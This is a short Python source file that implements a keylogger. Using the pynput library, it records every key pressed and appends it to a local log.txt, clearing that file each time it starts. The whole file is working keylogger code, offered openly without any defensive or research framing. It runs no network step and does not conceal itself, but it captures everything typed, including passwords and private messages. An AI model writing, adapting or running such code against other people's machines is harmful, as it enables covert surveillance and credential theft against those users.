from pynput import keyboard
import os

# function to record the keys and write them out to a txt file
def log_key(key):

    key = str(key).replace("'", "")

    with open("./log.txt", "a") as f:
        if key == "Key.enter":
            f.write("\n")
        elif key == "Key.space":
            f.write(" ")
        else:
            f.write(f"{key}")

# function to start the keylogger
def start_key_log():
    with keyboard.Listener(on_press=log_key) as listener:
        listener.join()

# empties the current log text file so it can be reused.
# was maining for testing
if os.path.exists("./log.txt"):
    open("./log.txt", "w")
start_key_log()
